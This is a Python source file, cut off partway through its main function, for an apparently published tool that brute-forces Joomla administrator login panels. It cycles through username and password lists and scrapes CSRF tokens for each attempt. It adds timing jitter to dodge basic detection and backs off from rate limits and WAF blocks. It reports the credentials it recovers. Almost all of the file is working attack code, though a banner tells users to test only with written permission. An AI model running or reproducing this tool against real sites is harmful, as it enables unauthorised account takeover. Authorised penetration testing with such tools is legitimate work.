#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import logging
import sys
import time
import random
from pathlib import Path
from typing import Generator, Optional, Tuple, List, Dict, Any
from datetime import datetime
import re
import warnings

try:
    import lxml
except ImportError:
    lxml = None  # type: ignore

import requests
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
from requests import Session, RequestException, Response
from tqdm import tqdm
from colorama import init as colorama_init, Fore, Style

# --- Constants ---
SCRIPT_VERSION = "1.0"
DEFAULT_USER_AGENT = f"JoomlaBrute/{SCRIPT_VERSION}"
LOG_FORMAT_CONSOLE = "[%(asctime)s] %(levelname)s: %(message)s"
LOG_FORMAT_FILE = (
    "[%(asctime)s] PID:%(process)d %(levelname)s [%(filename)s:%(lineno)d]: %(message)s"
)
DATE_FORMAT = "%H:%M:%S"
FILE_DATE_FORMAT = "%Y-%m-%d %H:%M:%S"

# Ignore the warning when BS4 parses XML as HTML
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)


# --- Logger Setup ---
def setup_logger(verbose: bool, log_file: Optional[Path] = None) -> logging.Logger:
    """Configure and return a logger with appropriate settings."""
    logger = logging.getLogger("joomla_brute")
    level = logging.DEBUG if verbose else logging.INFO
    logger.setLevel(logging.DEBUG)  # Set base level to debug, handlers control output

    # Clear any existing handlers to prevent duplicate messages
    for handler in logger.handlers[:]:
        logger.removeHandler(handler)

    # Console handler
    console_formatter = logging.Formatter(LOG_FORMAT_CONSOLE, datefmt=DATE_FORMAT)
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setFormatter(console_formatter)
    console_handler.setLevel(level)  # Use level set by verbose flag
    logger.addHandler(console_handler)

    # File handler (if specified)
    if log_file:
        try:
            # Ensure log directory exists
            log_file.parent.mkdir(parents=True, exist_ok=True)
            file_handler = logging.FileHandler(log_file, mode="a", encoding="utf-8")
            file_formatter = logging.Formatter(
                LOG_FORMAT_FILE, datefmt=FILE_DATE_FORMAT
            )
            file_handler.setFormatter(file_formatter)
            file_handler.setLevel(logging.DEBUG)  # Always log DEBUG to file
            logger.addHandler(file_handler)
        except Exception as e:
            logger.error(f"Failed to configure file logger at {log_file}: {e}")

    # Prevent propagation to root logger
    logger.propagate = False
    return logger


# --- File Handling ---
def read_lines(path: Path) -> Generator[str, None, None]:
    """Read lines from a file, stripping whitespace and ignoring empty/comment lines."""
    try:
        with path.open("r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                s = line.strip()
                if s and not s.startswith("#"):
                    yield s
    except FileNotFoundError:
        # Error will be logged where this function is called
        raise


# --- Input Validation ---
def validate_url(url: str) -> str:
    """Validate and normalize the URL."""
    if not re.match(r"^(http://|https://)", url, re.IGNORECASE):
        url = "http://" + url
    # Ensure it ends with a single slash for consistency
    return url.rstrip("/") + "/"


def validate_proxy(proxy: Optional[str]) -> Optional[str]:
    """Validate the proxy format and return it if valid."""
    if not proxy:
        return None

    if not proxy.startswith(("http://", "https://")):
        proxy = "http://" + proxy

    # Regex to handle potential user:pass@host:port format, though we only use host:port
    match = re.match(r"https?://(?:[^:@/]+(?::[^@/]+)?@)?([^:]+):(\d+)/?$", proxy)
    if not match:
        raise ValueError(
            f"Invalid proxy format: {proxy}. Expected format: http://host:port"
        )

    host, port_str = match.groups()
    port = int(port_str)

    # Validate IP or hostname (simple check)
    if not host:  # Basic check
        raise ValueError("Proxy host cannot be empty")

    # Validate Port
    if not (1 <= port <= 65535):
        raise ValueError(f"Invalid proxy port: {port}")

    # Reconstruct proxy string to ensure consistency
    # Note: requests library handles the http:// or https:// prefix correctly
    return proxy


# --- Core Logic Class ---
class JoomlaBrute:
    def __init__(
        self,
        base_url: str,
        users: List[str],
        passwords: List[str],
        proxy: Optional[str],
        delay: float,
        jitter: float,
        timeout: float,
        max_retries: int,
        exit_on_success: bool,
        quiet: bool,
        logger: logging.Logger,
        user_agent: Optional[str] = None,
    ):
        self.base_url = base_url  # Already has trailing slash from validate_url
        self.login_url = self.base_url + "administrator/"
        self.users = users
        self.passwords = passwords
        self.proxies = {"http": proxy, "https": proxy} if proxy else {}
        self.delay = max(0, delay)
        self.jitter = max(0, jitter)
        self.timeout = max(1.0, timeout)
        self.max_retries = max(0, max_retries)
        self.exit_on_success = exit_on_success
        self.quiet = quiet
        self.logger = logger
        self.user_agent = user_agent or DEFAULT_USER_AGENT

        self.found_credentials: List[Tuple[str, str]] = []
        self.request_count = 0
        self.start_time = datetime.now()
        self.rate_limited = False
        self.rate_limit_backoff = 60  # Initial backoff in seconds

    def new_session(self) -> Session:
        """Create a new session with appropriate headers and settings."""
        session = requests.Session()
        session.headers.update(
            {
                "User-Agent": self.user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Referer": self.login_url,  # Add Referer
            }
        )
        if self.proxies:
            session.proxies.update(self.proxies)
            self.logger.debug(
                f"Session configured with proxy: {self.proxies.get('http')}"
            )
        return session

    def _send_request(
        self,
        session: Session,
        method: str,
        url: str,
        data: Optional[Dict[str, Any]] = None,
        **kwargs,
    ) -> Response:
        """Send HTTP request with retry and rate-limit handling."""
        self.request_count += 1
        retries = 0
        last_exception: Optional[Exception] = None

        while retries <= self.max_retries:
            try:
                if self.rate_limited:
                    wait_time = self.rate_limit_backoff * (
                        2**retries
                    )  # Exponential backoff
                    self.logger.warning(
                        f"{Fore.MAGENTA}Rate limiting detected or persistent error. "
                        f"Waiting for {wait_time:.1f}s...{Style.RESET_ALL}"
                    )
                    time.sleep(wait_time)
                    self.rate_limited = False  # Assume we can try again

                kwargs.setdefault("timeout", self.timeout)
                kwargs.setdefault(
                    "allow_redirects", False
                )  # Handle redirects manually if needed

                self.logger.debug(f"Sending {method} request to {url}")
                if method.upper() == "GET":
                    resp = session.get(url, **kwargs)
                else:  # POST
                    self.logger.debug(f"POST data: {data}")
                    resp = session.post(url, data=data, **kwargs)
                self.logger.debug(f"Received status: {resp.status_code}")

                # Check for rate limiting / blocking status codes
                # 403 Forbidden can sometimes indicate WAF block
                if resp.status_code in (429, 403):
                    # Basic check for common rate limit messages
                    resp_text_lower = resp.text.lower()
                    if (
                        "too many requests" in resp_text_lower
                        or "rate limit" in resp_text_lower
                        or "blocked" in resp_text_lower
                        or "forbidden" in resp_text_lower
                    ):
                        self.logger.warning(
                            f"Potential rate limit/block detected (Status: {resp.status_code})"
                        )
                        self.rate_limited = True
                        retries += 1
                        last_exception = RequestException(
                            f"Rate limited/Blocked (Status {resp.status_code})"
                        )
                        continue  # Retry after backoff

                # If we reach here, request was successful or failed for other reasons
                return resp

            except RequestException as e:
                last_exception = e
                retries += 1
                if retries <= self.max_retries:
                    sleep_time = retries * 1.5  # Linear backoff for network errors
                    self.logger.warning(
                        f"Request error ({retries}/{self.max_retries}): {e}. Retrying in {sleep_time:.1f}s"
                    )
                    time.sleep(sleep_time)
                else:
                    self.logger.error(
                        f"Max retries ({self.max_retries}) exceeded for request to {url}."
                    )
                    raise RequestException(
                        f"Max retries exceeded: {last_exception}"
                    ) from last_exception

        # Should not be reached if max_retries >= 0, but satisfy type checker
        raise RequestException(
            f"Request failed after {self.max_retries} retries: {last_exception}"
        )

    def fetch_token(self, session: Session) -> Optional[Tuple[str, str]]:
        """Fetch CSRF token and potentially other hidden fields from the login page."""
        self.logger.debug(
            f"Fetching login page to get CSRF token from {self.login_url}"
        )
        try:
            resp = self._send_request(session, "GET", self.login_url)
            resp.raise_for_status()  # Check for 2xx status

            soup = BeautifulSoup(resp.text, "html.parser")

            # Find the login form (more specific selectors if possible)
            form = (
                soup.find("form", id="form-login")
                or soup.find("form", class_="form-horizontal")
                or soup.find("form", action=re.compile("login", re.IGNORECASE))
                or soup.find("form")
            )  # Fallback

            if not form:
                self.logger.error("Login form could not be found on the page.")
                return None

            # Find all hidden inputs within the form
            hidden_inputs = form.find_all("input", type="hidden")
            if not hidden_inputs:
                self.logger.warning(
                    "No hidden inputs found in the form. CSRF might not be used or form is unusual."
                )
                # Try to find *any* input that might be a token (heuristic)
                # Common Joomla token names: hash, csrf.token, jform[token]
                token_input = form.find(
                    "input",
                    {
                        "name": re.compile(
                            r"([a-f0-9]{32}|csrf\.token|jform\[token\])", re.I
                        )
                    },
                )
                if token_input:
                    name = token_input.get("name")
                    value = token_input.get("value", "1")  # Default value '1' if empty
                    if name:
                        self.logger.debug(
                            f"Found potential token field (heuristic): {name}"
                        )
                        return name, value
                # If still nothing, maybe no token needed? Return a dummy? Risky.
                self.logger.error("Could not identify a CSRF token field.")
                return None  # Indicate failure to find token

            # Identify the CSRF token: often the last hidden input with value '1'
            # or a 32-char hex string, or named containing 'token'
            potential_tokens = []
            for input_field in hidden_inputs:
                name = input_field.get("name")
                value = input_field.get("value", "1")  # Default to '1' if value missing
                if name:
                    # Common Joomla token patterns
                    if (
                        value == "1"
                        and len(name) == 32
                        and all(c in "abcdef0123456789" for c in name)
                    ):
                        potential_tokens.append((name, value, 10))  # High priority
                    elif name == "option" or name == "task" or name == "return":
                        continue  # Skip standard Joomla form fields
                    elif "token" in name.lower():
                        potential_tokens.append((name, value, 5))  # Medium priority
                    else:
                        potential_tokens.append(
                            (name, value, 1)
                        )  # Low priority (might be other hidden fields)

            if not potential_tokens:
                self.logger.error("Filtered out all hidden inputs, cannot find token.")
                return None

            # Sort by priority (higher first), then maybe length of name?
            potential_tokens.sort(key=lambda x: x[2], reverse=True)
            best_token = potential_tokens[0]
            token_name, token_value = best_token[0], best_token[1]

            self.logger.debug(f"Identified CSRF token field: '{token_name}'")
            return token_name, token_value

        except RequestException as e:
            self.logger.error(f"Failed to fetch or parse login page for token: {e}")
            return None
        except Exception as e:
            self.logger.error(f"An unexpected error occurred while fetching token: {e}")
            return None

    def detect_joomla_version(self, session: Session) -> Optional[str]:
        """Try to detect Joomla version using various methods."""
        self.logger.debug("Attempting to detect Joomla version...")

        # Method 1: Check login page generator meta tag
        try:
            resp = session.get(
                self.login_url, timeout=self.timeout, allow_redirects=True
            )
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, "html.parser")
                meta_generator = soup.find("meta", attrs={"name": "generator"})
                if meta_generator:
                    content = meta_generator.get("content", "")
                    match = re.search(
                        r"Joomla!?(?: CMS)? ([\d.]+)", content, re.IGNORECASE
                    )
                    if match:
                        version = match.group(1)
                        self.logger.debug(f"Version detected via meta tag: {version}")
                        return version
        except Exception as e:
            self.logger.debug(f"Error checking meta tag for version: {e}")

        # Method 2: Check administrator/manifests/files/joomla.xml (common path)
        # Ensure base URL ends with '/'
        manifest_url = self.base_url + "administrator/manifests/files/joomla.xml"
        self.logger.debug(f"Checking manifest file at: {manifest_url}")
        try:
            # Use a shorter timeout for this specific check
            manifest_resp = session.get(manifest_url, timeout=min(self.timeout, 5.0))
            if manifest_resp.status_code == 200:
                parser = "lxml-xml" if lxml else "html.parser"  # Use lxml if available
                soup = BeautifulSoup(manifest_resp.text, parser)
                version_tag = soup.find("version")
                if version_tag and version_tag.text:
                    version = version_tag.text.strip()
                    self.logger.debug(f"Version detected via manifest: {version}")
                    return version
        except RequestException:
            self.logger.debug("Manifest file not found or request failed.")
        except Exception as e:
            self.logger.debug(f"Error parsing manifest file: {e}")

        # Method 3: Language file path (less reliable)
        lang_url = self.base_url + "language/en-GB/en-GB.xml"
        self.logger.debug(f"Checking language file at: {lang_url}")
        try:
            lang_resp = session.get(lang_url, timeout=min(self.timeout, 5.0))
            if lang_resp.status_code == 200:
                parser = "lxml-xml" if lxml else "html.parser"
                soup = BeautifulSoup(lang_resp.text, parser)
                version_tag = soup.find("version")
                if version_tag and version_tag.text:
                    version = version_tag.text.strip()
                    self.logger.debug(f"Version detected via language file: {version}")
                    return version
        except RequestException:
            self.logger.debug("Language file not found or request failed.")
        except Exception as e:
            self.logger.debug(f"Error parsing language file: {e}")

        self.logger.debug("Could not detect Joomla version via common methods.")
        return None

    def try_login(
        self, session: Session, username: str, password: str, token: Tuple[str, str]
    ) -> bool:
        """Attempt to login with the given credentials."""
        token_name, token_val = token
        data = {
            "username": username,
            "passwd": password,  # 'passwd' is common, but 'password' might also be used
            "option": "com_login",
            "task": "login",
            "return": "aW5kZXgucGhw",  # Base64 encoded 'index.php'
            token_name: token_val,
            # Some forms might have this:
            # "remember": "yes"
        }

        # Some templates might use 'password' instead of 'passwd'
        # We could try both, but let's stick to 'passwd' first
        # data_alt = data.copy()
        # data_alt["password"] = data_alt.pop("passwd")

        try:
            # Send POST request, do not follow redirects automatically
            resp = self._send_request(
                session, "POST", self.login_url, data=data, allow_redirects=False
            )

            # --- Success Check Strategy ---

            # 1. Redirect Check: Successful login often results in a 302/303 redirect
            #    to the main administrator page (index.php) without error parameters.
            if resp.status_code in (302, 303):
                location = resp.headers.get("Location", "").lower()
                # Check if it redirects back to login or an error page
                if (
                    "index.php" in location
                    and "login" not in location
                    and "error" not in location
                ):
                    self.logger.debug(
                        f"Successful login detected via redirect to: {location}"
                    )
                    return True
                else:
                    self.logger.debug(
                        f"Redirect detected, but likely not a successful login: {location}"
                    )

            # 2. Response Body Check (if no redirect or redirect was ambiguous):
            #    Look for absence of login failure messages and presence of admin dashboard elements.
            if resp.status_code == 200:  # Sometimes login happens without redirect
                resp_text_lower = resp.text.lower()
                # Check for common failure messages
                login_failed = False
                failure_patterns = [
                    "username and password do not match",
                    "invalid username or password",
                    "login failed",
                    "mod-login-username",  # Presence of login form elements again
                    'id="form-login"',
                    "invalid token",  # Handled separately for token refresh
                ]
                for pattern in failure_patterns:
                    if pattern in resp_text_lower:
                        # Handle invalid token specifically
                        if "invalid token" in pattern:
                            self.logger.warning(
                                "Detected 'Invalid Token'. Session/Token might have expired."
                            )
                            # Signal to potentially refresh token (caller should handle this)
                            raise RequestException(
                                "Invalid Token"
                            )  # Use exception to signal this condition
                        login_failed = True
                        break

                if not login_failed:
                    # Check for common success indicators (dashboard elements)
                    success_patterns = [
                        "logout",
                        "log out",
                        "cpanel",
                        "control panel",
                        "dashboard",
                        "logged in",
                        "administration",
                        'class="page-title"',  # Common in admin areas
                    ]
                    for pattern in success_patterns:
                        if pattern in resp_text_lower:
                            self.logger.debug(
                                f"Successful login detected via response body content ('{pattern}')"
                            )
                            return True

                    # If no clear failure or success, assume failure for safety
                    self.logger.debug(
                        "Login status unclear from response body (no strong fail/success indicators). Assuming failure."
                    )

            # 3. Cookie Check (Less reliable on its own, but good supplement)
            # Look for session cookies typically set after admin login
            # Example: 'joomla_user_state=logged_in', specific session ID cookies
            # This check is complex as cookie names can vary. Might add later if needed.

            # If none of the success checks passed, assume failure
            return False

        except RequestException as e:
            # Handle the specific "Invalid Token" signal
            if "Invalid Token" in str(e):
                raise  # Re-raise to signal token refresh needed
            self.logger.debug(
                f"Network or request error during login attempt for {username}: {e}"
            )
            return False  # Treat request errors as login failure for this attempt

    def sleep_between_attempts(self) -> None:
        """Sleep between attempts with jitter to avoid basic detection."""
        if self.delay > 0:
            jitter_amount = (
                random.uniform(-self.jitter, self.jitter) if self.jitter > 0 else 0
            )
            sleep_time = max(0.1, self.delay + jitter_amount)  # Ensure minimum sleep
            self.logger.debug(f"Sleeping for {sleep_time:.2f} seconds...")
            time.sleep(sleep_time)

    def display_stats(self) -> None:
        """Display statistics about the brute force operation using underscore separators."""
        if self.quiet:  # Don't display stats in quiet mode
            return

        elapsed = max(
            0.1, (datetime.now() - self.start_time).total_seconds()
        )  # Avoid division by zero
        attempts_per_sec = self.request_count / elapsed

        # Format time
        seconds_total = int(elapsed)
        hours, remainder = divmod(seconds_total, 3600)
        minutes, seconds = divmod(remainder, 60)
        time_format = f"{hours:02d}:{minutes:02d}:{seconds:02d}"

        # Define line width for consistency
        line_width = 70  # Adjust as needed

        # --- Summary Report ---
        print(f"\n{Fore.CYAN}{'_' * line_width}")  # Top border
        title = "JOOMLA BRUTE FORCE - SUMMARY REPORT"
        padding = line_width - len(title) - 2  # -2 for surrounding spaces
        left_pad = max(0, padding // 2)
        right_pad = max(0, padding - left_pad)
        print(
            f"{Style.BRIGHT}{' ' * left_pad}{title}{' ' * right_pad}{Style.RESET_ALL}"
        )  # Centered title
        print(
            f"{Fore.CYAN}{'_' * line_width}{Style.RESET_ALL}"
        )  # Separator/Bottom border

        stats = [
            ("Target URL", self.login_url),
            ("Time Elapsed", time_format),
            ("Total Attempts", str(self.request_count)),
            ("Average Speed", f"{attempts_per_sec:.2f} attempts/s"),
            ("Credentials Found", str(len(self.found_credentials))),
        ]

        max_label_len = max(len(label) for label, _ in stats)

        for label, value in stats:
            # Pad label to max length for alignment
            padded_label = f"{label}{' ' * (max_label_len - len(label))}"
            # Print aligned stat without vertical bars
            print(
                f"  {Fore.YELLOW}{padded_label}{Style.RESET_ALL} {Style.DIM}:{Style.RESET_ALL} {Fore.WHITE}{value}{Style.RESET_ALL}"
            )

        print(
            f"{Fore.CYAN}{'_' * line_width}{Style.RESET_ALL}\n"
        )  # Bottom border for section

        # --- Successful Logins ---
        if self.found_credentials:
            print(f"{Fore.GREEN}{'_' * line_width}")  # Top border
            title_succ = "SUCCESSFUL LOGINS"
            padding_succ = line_width - len(title_succ) - 2  # -2 for surrounding spaces
            left_pad_succ = max(0, padding_succ // 2)
            right_pad_succ = max(0, padding_succ - left_pad_succ)
            print(
                f"{Style.BRIGHT}{' ' * left_pad_succ}{title_succ}{' ' * right_pad_succ}{Style.RESET_ALL}"
            )  # Centered title
            print(
                f"{Fore.GREEN}{'_' * line_width}{Style.RESET_ALL}"
            )  # Separator/Bottom border

            # Find the longest username found for alignment
            if self.found_credentials:  # Ensure list is not empty
                max_user_len = max(len(user) for user, pwd in self.found_credentials)
            else:
                max_user_len = 0  # Default if somehow empty here

            for user, pwd in self.found_credentials:
                # Pad username to the max length found
                padded_user = f"{user}{' ' * (max_user_len - len(user))}"
                # Print credential indented, with aligned colon
                print(
                    f"  {Style.BRIGHT}{Fore.WHITE}{padded_user}{Style.RESET_ALL} {Style.DIM}:{Style.RESET_ALL} {Style.BRIGHT}{Fore.GREEN}{pwd}{Style.RESET_ALL}"
                )

            print(
                f"{Fore.GREEN}{'_' * line_width}{Style.RESET_ALL}\n"
            )  # Bottom border for section

    def run(self) -> bool:
        """Run the brute force attack and return True if any credentials found."""
        colorama_init(autoreset=True)  # Ensure styles reset automatically

        # --- Initial Check ---
        self.logger.info(f"Starting Joomla Brute Force attack on {self.login_url}")
        self.logger.debug(f"User Agent: {self.user_agent}")
        if self.proxies:
            self.logger.debug(f"Using Proxy: {self.proxies.get('http')}")
        self.logger.debug(
            f"Delay: {self.delay}s, Jitter: {self.jitter}s, Timeout: {self.timeout}s"
        )

        initial_session = self.new_session()
        try:
            self.logger.debug(
                "Performing initial connectivity test and version detection..."
            )
            # Fetch token implicitly tests connectivity
            initial_token = self.fetch_token(initial_session)
            if not initial_token:
                self.logger.error(
                    "Initial connectivity test failed: Could not fetch login page or token."
                )
                return False
            self.logger.debug("Connectivity test passed.")

            version = self.detect_joomla_version(initial_session)
            if version:
                self.logger.info(
                    f"{Fore.GREEN}Detected Joomla version: {version}{Style.RESET_ALL}"
                )
            else:
                self.logger.warning("Could not automatically detect Joomla version.")

        except Exception as e:
            self.logger.error(f"Initial connectivity test failed: {e}")
            return False
        finally:
            initial_session.close()  # Close the test session

        # --- Brute Force Loop ---
        total_passwords = len(self.passwords)
        credentials_found_flag = False  # Use a flag instead of returning directly

        for user_index, user in enumerate(self.users):
            user_label = f"{Fore.YELLOW}{user}{Style.RESET_ALL}"
            self.logger.debug(
                f"Attempting user: {user_label} ({user_index + 1}/{len(self.users)})"
            )

            session = self.new_session()
            token: Optional[Tuple[str, str]] = None
            token_attempts = 0
            MAX_TOKEN_ATTEMPTS = 3

            # Get initial token for this user's session
            while not token and token_attempts < MAX_TOKEN_ATTEMPTS:
                try:
                    token = self.fetch_token(session)
                    if not token:
                        self.logger.warning(
                            f"Failed to get token for {user_label} (Attempt {token_attempts + 1})"
                        )
                        time.sleep(2)  # Wait before retry
                except Exception as e:
                    self.logger.error(f"Error fetching token for {user_label}: {e}")
                token_attempts += 1

            if not token:
                self.logger.error(
                    f"Could not obtain CSRF token for user {user_label} after {MAX_TOKEN_ATTEMPTS} attempts. Skipping user."
                )
                session.close()
                continue  # Skip to the next user

            # Progress bar setup
            progress_bar = tqdm(
                self.passwords,
                desc=f"{Fore.CYAN}User: {user}{Style.RESET_ALL}",
                unit="pwd",
                total=total_passwords,
                disable=self.quiet,  # Disable progress bar in quiet mode
                ncols=100,  # Adjust width
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}{postfix}]",
            )

            password_found_for_user = False
            for pwd in progress_bar:
                if (
                    password_found_for_user
                ):  # If found for this user, skip remaining passwords
                    break

                if not token:  # Should not happen here normally, but safety check
                    self.logger.error(
                        "Token lost unexpectedly. Skipping remaining passwords for this user."
                    )
                    break

                try:
                    # Update progress bar description
                    progress_bar.set_postfix_str(
                        f"{Fore.MAGENTA}Trying: {pwd[:15]}...{Style.RESET_ALL}",
                        refresh=True,
                    )

                    # Try login
                    login_success = self.try_login(session, user, pwd, token)

                    if login_success:
                        progress_bar.close()  # Close bar before printing success
                        found_cred = f"{user}:{pwd}"
                        print(
                            f"\n{Fore.GREEN}{Style.BRIGHT}"
                            f"[*] SUCCESS! Credentials found: {found_cred}"
                            f"{Style.RESET_ALL}"
                        )
                        self.logger.debug(f"Credentials found: {found_cred}")
                        self.found_credentials.append((user, pwd))
                        credentials_found_flag = True
                        password_found_for_user = True

                        if self.exit_on_success:
                            self.logger.info("Exiting due to --exit-on-success flag.")
                            session.close()
                            # Don't return here, let it finish the loop and display stats once.
                        else:
                            # No break here if we want to find ALL passwords for this user
                            # break # Break inner password loop, move to next user (standard behavior)
                            pass  # Continue checking passwords for this user if break is commented out

                    else:
                        # Login failed, continue
                        pass

                except RequestException as e:
                    # Handle specific token errors by attempting refresh
                    if "Invalid Token" in str(e):
                        self.logger.warning(
                            "Invalid token detected. Attempting to refresh token..."
                        )
                        try:
                            token = self.fetch_token(session)
                            if not token:
                                self.logger.error(
                                    "Failed to refresh token. Skipping rest of passwords for this user."
                                )
                                break  # Exit password loop for this user
                            else:
                                self.logger.info("Token refreshed successfully.")
                                # Optionally retry the current password with the new token
                                # continue
                        except Exception as refresh_e:
                            self.logger.error(f"Error refreshing token: {refresh_e}")
                            break  # Exit password loop for this user
                    else:
                        # Other request errors (already logged in _send_request)
                        # Consider breaking if too many errors occur for this user
                        pass

                except Exception as e:
                    self.logger.error(
                        f"Unexpected error during login attempt for {user}:{pwd} -> {e}"
                    )
                    # Decide if we should break or continue

                # Apply delay+jitter if login didn't succeed or if we are continuing after success (and not exiting)
                if not (login_success and self.exit_on_success):
                    self.sleep_between_attempts()

            # End of password loop for the user
            progress_bar.close()
            if not password_found_for_user:
                self.logger.debug(
                    f"Finished trying all passwords for {user_label}. No match found."
                )

            session.close()  # Close session for this user

            # Check if we should exit the entire process
            if credentials_found_flag and self.exit_on_success:
                break  # Exit the main user loop

        # --- End of Run ---
        self.display_stats()  # Display final stats

        if not credentials_found_flag:
            self.logger.info("Brute-force attempt completed. No credentials found.")

        return credentials_found_flag


def main() -> None:
    """Main function for the Joomla brute force tool."""
    # --- Clear Screen ---
    # (Clearing screen can be annoying if user wants to see previous output)
    # os_name = platform.system()
    # if os_name == "Windows":
    #     os.system("cls")
    # else:
    #     os.system("clear")

    # --- Argument Parser ---
    parser = argparse.ArgumentParser(
        description=f"Joomla Administrator Brute Force Tool v{SCRIPT_VERSION}. Use responsibly.",
        epilog="Example: python joomla_brute.py -u http://example.com -UL users.txt -PL pass.txt -d 0.5 -j 0.2",
        formatter_class=argparse.RawTextHelpFormatter,  # Keep formatting in help
    )

    # Target
    parser.add_argument(
        "-u",
        "--url",
        required=True,
        help="Base URL of Joomla site (e.g., http://example.com)",
    )

    # Credentials
    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument("-U", "--user", help="Single username")
    user_group.add_argument(
        "-UL", "--userlist", type=Path, help="File of usernames, one per line"
    )

    pass_group = parser.add_mutually_exclusive_group(required=True)
    pass_group.add_argument("-p", "--password", help="Single password")
    pass_group.add_argument(
        "-PL", "--passwordlist", type=Path, help="File of passwords, one per line"
    )

    # Network Options
    parser.add_argument("--proxy", help="HTTP/S proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument(
        "-d",
        "--delay",
        type=float,
        default=1.0,
        help="Base delay between login attempts in seconds (default: 1.0)",
    )
    parser.add_argument(
        "-j",
        "--jitter",
        type=float,
        default=0.5,
        help="Random +/- jitter added to delay in seconds (default: 0.5)",
    )
    parser.add_argument(
        "-t",
        "--timeout",
        type=float,
        default=10.0,
        help="Request timeout in seconds (default: 10.0)",
    )
    parser.add_argument(
        "-r",
        "--retries",
        type=int,
        default=3,
        help="Max retries for failed network requests (default: 3)",
    )
    parser.add_argument(
        "-a",
        "--user-agent",
        type=str,
        default=None,  # Default handled by class
        help=f"Custom User-Agent string (default: {DEFAULT_USER_AGENT})",
    )

    # Control Flow & Output
    parser.add_argument(
        "-l",
        "--log",
        type=Path,
        default=None,
        help="Log file path (logs debug info regardless of verbosity)",
    )
    parser.add_argument(
        "-x",
        "--exit-on-success",
        action="store_true",
        help="Exit immediately after finding the first valid credential",
    )
    parser.add_argument(
        "-q",
        "--quiet",
        action="store_true",
        help="Minimal output (suppress banner, progress bars, stats)",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Enable verbose logging to console (DEBUG level)",
    )
    parser.add_argument(
        "--version", action="version", version=f"%(prog)s {SCRIPT_VERSION}"
    )

    args = parser.parse_args()

    # --- Setup Logger ---
    logger = setup_logger(args.verbose, args.log)

    # --- ASCII Banner & Warning ---
    if not args.quiet:
        # Use raw f-string (fr) to handle backslashes literally
        ascii_art = rf"""
{Style.RESET_ALL}
             {Fore.YELLOW}* Brute Forcing Joomla [{Fore.CYAN}v{SCRIPT_VERSION}{Fore.YELLOW}] Logins *{Style.RESET_ALL}

                       .--""--.
                      /        \\
                     |  {Fore.RED}[[J!]]{Style.RESET_ALL}  |  {Fore.YELLOW}<-- Target Lock{Style.RESET_ALL}
                     \  .--.  /
                      \/    \/
                       |    |
                       |    |_______
                       \    /#######\\
                        \  / ####### \\
                         \/ ######### \\
                          \###########/
                           \{Fore.MAGENTA}#########{Style.RESET_ALL}/ {Fore.CYAN}<-- Key Storm{Style.RESET_ALL}
                            \{Fore.MAGENTA}#######{Style.RESET_ALL}/
                             \{Fore.MAGENTA}#####{Style.RESET_ALL}/ \   /
                              \{Fore.MAGENTA}###{Style.RESET_ALL}/ | \_/ |
                               \{Fore.MAGENTA}.{Style.RESET_ALL}/ / / \ \\ \\ {Fore.CYAN}<-- Hammer Time{Style.RESET_ALL}
                                `  \ \_/ /
                                    -----
        by 0x434b (mail@0x434b.dev)
          --> https://github.com/0xricksanchez/joomla_brute
        """  # <-- End raw f-string
        print(ascii_art)
        print(
            f"{Fore.RED}{Style.BRIGHT}"
            f"=================================== WARNING ==================================="
        )
        print(
            f"{Fore.YELLOW}"
            f"[!] This tool attempts to log into Joomla administrator panels."
        )
        print(
            f"[!] Use it ONLY on systems you have EXPLICIT, WRITTEN PERMISSION to test."
        )
        print(f"[!] Unauthorized access attempts are ILLEGAL and UNETHICAL.")
        print(f"[!] The author assumes NO responsibility for misuse.")
        print(
            f"{Fore.RED}"
            f"==============================================================================="
            f"{Style.RESET_ALL}\n"
        )
        # Don't pause here, let the config table show immediately
        # time.sleep(1)

    # --- Process Inputs ---
    try:
        url = validate_url(args.url)
        login_url_display = url + "administrator/"
        proxy = validate_proxy(args.proxy) if args.proxy else None

        # Load users
        if args.user:
            users = [args.user]
            user_source = "Single User"
        else:
            if not args.userlist.is_file():
                logger.error(f"User list file not found: {args.userlist}")
                sys.exit(1)
            users = list(read_lines(args.userlist))
            user_source = str(args.userlist)
            if not users:
                logger.error(f"No valid usernames found in {args.userlist}")
                sys.exit(1)

        # Load passwords
        if args.password:
            passwords = [args.password]
            pass_source = "Single Password"
        else:
            if not args.passwordlist.is_file():
                logger.error(f"Password list file not found: {args.passwordlist}")
                sys.exit(1)
            passwords = list(read_lines(args.passwordlist))
            pass_source = str(args.passwordlist)
            if not passwords:
                logger.error(f"No valid passwords found in {args.passwordlist}")
                sys.exit(1)

        # --- Display Configuration Table ---
        if not args.quiet:
            config_data = [
                ("Target URL", login_url_display),
                ("User Source", f"{len(users)} ({user_source})"),
                ("Password Source", f"{len(passwords)} ({pass_source})"),
                ("Total Combinations", str(len(users) * len(passwords))),
                ("User Agent", args.user_agent or DEFAULT_USER_AGENT),
                ("Proxy", proxy or "Not Used"),
                ("Delay / Jitter", f"{args.delay:.1f}s / {args.jitter:.1f}s"),
                ("Timeout / Retries", f"{args.timeout:.1f}s / {args.retries}"),
                ("Exit on Success", str(args.exit_on_success)),
                ("Log File", str(args.log) if args.log else "Not Used"),
            ]

            line_width = 82

            print(f"{Fore.BLUE}{'_' * line_width}")
            title_cfg = "RUN CONFIGURATION"
            padding_cfg = line_width - len(title_cfg)
            left_pad_cfg = padding_cfg // 2
            right_pad_cfg = padding_cfg - left_pad_cfg
            # Keep the vertical bars just for the centered title line
            print(
                f"{Style.BRIGHT}{' ' * left_pad_cfg}{title_cfg}{' ' * right_pad_cfg}{Style.RESET_ALL}{Fore.BLUE}"
            )
            print(f"{'_' * line_width}{Style.RESET_ALL}")  # End color here

            max_label_len_cfg = max(len(label) for label, _ in config_data)

            for label, value in config_data:
                # Pad label to max length for alignment
